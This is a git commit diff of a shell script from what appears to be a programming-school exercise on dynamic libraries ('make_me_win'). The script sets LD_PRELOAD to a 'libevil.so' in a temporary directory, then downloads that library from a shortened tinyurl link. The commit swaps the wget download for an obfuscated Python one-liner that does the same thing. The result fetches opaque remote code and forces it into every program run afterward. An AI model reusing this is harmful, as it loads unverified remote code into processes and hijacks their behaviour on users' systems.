99394c0bdaa426cb289de8213041bd554b156a67
patrickdeyoreo <pdeyoreo@gmail.com>
2019-09-17 10:28:50 -0700

    Had to abandon curl in 0x18 task 4 for compatibility so now it's a big chunk of Python

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 export LD_PRELOAD="$(mktemp -d)/libevil.so${LD_PRELOAD:+:${LD_PRELOAD}}"
-LD_PRELOAD="" wget -q -O "${LD_PRELOAD%%:*}" 'https://tinyurl.com/cr4ckm3'
+LD_PRELOAD="" python3 - "${LD_PRELOAD%%/libevil.so*}/libevil.so" <<<'__import__("shutil").copyfileobj(__import__("urllib.request").request.urlopen("https://tinyurl.com/cr4ckm3"), open(__import__("sys").argv[1], "wb"))'
